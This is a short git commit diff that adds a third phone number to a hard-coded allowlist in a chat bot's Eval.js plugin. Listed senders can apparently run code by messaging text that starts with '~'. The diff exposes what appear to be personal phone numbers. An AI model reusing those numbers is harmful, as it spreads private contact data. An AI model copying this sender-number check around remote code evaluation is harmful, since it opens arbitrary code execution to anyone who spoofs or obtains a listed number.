7a69f56af88810607e82184fe38c79a3627acbf1
Ajsal sparky <130032226+A-J-S-A-L-S-P-A-R-K-Y@users.noreply.github.com>
2024-10-11 15:05:17 +0530

    Update Eval.js

--- plugins/Eval.js
+++ plugins/Eval.js
@@ -35,7 +35,7 @@ eypz({
 		reply
 	}) => {
 		
-    var Ameen = ['916238768108', '918078438059']
+    var Ameen = ['916238768108', '918078438059','919539412641']
 		if (Ameen.includes(senderNumber)) {
         if (body.startsWith("~")) {
             try {
